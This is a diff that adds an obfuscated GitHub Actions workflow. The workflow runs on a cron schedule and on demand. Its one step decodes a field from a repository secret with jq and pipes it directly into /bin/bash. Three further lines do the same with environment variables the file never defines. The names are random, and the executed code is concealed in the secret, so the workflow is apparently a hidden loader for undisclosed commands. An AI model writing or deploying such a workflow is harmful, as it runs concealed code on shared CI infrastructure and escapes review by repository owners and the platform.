@@ -1,0 +1,21 @@
+name: baozhengnbv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baozhengnbv
+        env:
+          igcb8004: ${{ secrets.igcb8004 }}
+        run: |
+          echo $igcb8004 | jq -r .oo773 | /bin/bash
+          echo $elbl6 | jq -r .mo0 | /bin/bash
+          echo $c2 | jq -r .l2 | /bin/bash
+          echo $bc8685 | jq -r .z2 | /bin/bash
+
